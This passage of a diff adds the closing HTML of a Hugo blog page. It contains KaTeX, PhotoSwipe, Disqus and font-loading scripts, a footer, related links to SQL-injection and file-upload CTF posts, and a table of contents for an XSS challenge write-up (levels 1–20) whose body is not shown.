+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">Related contents</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/posts/sqli_blind_injection/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">SQL注入：盲注</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/posts/file_upload_ggctf_upload/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">File Upload: ggctf-upload</h2>
+        </div>
+    </a>
+</article>
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "medicwrf" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy;
+        
+        2022 Under The Ginkgo
+    </section>
+
+    <section class="powerby">
+        
+            Cogito, ergo sum <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <section class="powerby">
+      <span id="busuanzi_container_site_pv" style='display:none'>
+        Viwe <span id="busuanzi_value_site_pv"></span> times
+      </span>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#xss-挑战之旅">XSS 挑战之旅</a>
+      <ul>
+        <li><a href="#level1">level1</a></li>
+        <li><a href="#level2">level2</a></li>
+        <li><a href="#level3">level3</a></li>
+        <li><a href="#level4">level4</a></li>
+        <li><a href="#level5">level5</a></li>
+        <li><a href="#level6">level6</a></li>
+        <li><a href="#level7">level7</a></li>
+        <li><a href="#level8">level8</a></li>
+        <li><a href="#level9">level9</a></li>
+        <li><a href="#level10">level10</a></li>
+        <li><a href="#level11">level11</a></li>
+        <li><a href="#level12">level12</a></li>
+        <li><a href="#level13">level13</a></li>
+        <li><a href="#level14">level14</a></li>
+        <li><a href="#level15">level15</a></li>
+        <li><a href="#level16">level16</a></li>
+        <li><a href="#level17">level17</a></li>
+        <li><a href="#level18">level18</a></li>
+        <li><a href="#level19">level19</a></li>
+        <li><a href="#level-20">level 20</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
